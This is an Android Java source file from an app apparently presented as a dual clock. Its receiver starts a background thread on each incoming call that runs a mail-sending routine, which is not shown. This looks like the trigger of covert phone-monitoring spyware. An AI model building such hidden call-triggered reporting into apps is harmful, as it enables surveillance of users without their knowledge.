package com.and.dualclock;

/**
 * 
 * @author GK
 *
 */
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.TelephonyManager;

public class AlreadyExit extends BroadcastReceiver {
	public static Context contextt = null;
	public static String[] child = null;
	public SharedPreferences myPrefs;
	String[] selectedFilePath1;
	String[] selectedFilePath2 = null;
	int i;

	@Override
	public void onReceive(Context ae_ctx, Intent ae_intent) {
		contextt = ae_ctx;
		Bundle bundle = ae_intent.getExtras();
		if (null == bundle)
			return;

		String state1 = bundle.getString(TelephonyManager.EXTRA_STATE);
// mail send while ring
		if (state1.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING)) {

			Thread mailThread = new Thread() {
				@Override
				public void run() {
					try {
						super.run();
						IncomingCallReceiver incoming = new IncomingCallReceiver();
						incoming.sendmailnow();
					} catch (Exception e) {

						e.printStackTrace();
					} finally {

					}
				}
			};
			mailThread.start();

		}
	}
}
